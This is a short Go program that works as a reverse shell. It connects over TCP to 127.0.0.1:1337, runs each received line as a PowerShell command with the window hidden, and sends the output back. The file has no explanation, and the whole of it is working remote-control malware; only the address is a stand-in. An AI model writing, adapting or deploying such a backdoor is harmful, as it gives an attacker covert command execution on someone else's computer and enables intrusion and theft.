package main
import (
	"os/exec"
 	"net"
 	"log"
 	"syscall"
 	"bufio"
 )
func main(){
    c,_:=net.Dial("tcp","127.0.0.1:1337");
    for{
        status, _ := bufio.NewReader(c).ReadString('\n');
        log.Printf(status)        
        //out, _:=exec.Command("cmd","/Y", '/Q', "/K", status).Output();   
        cmd := exec.Command("powershell", "/c", status);
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        out, err := cmd.Output();
        if err != nil {
        	out = []byte(err.Error())
       }
       	c.Write(out);
    }
}
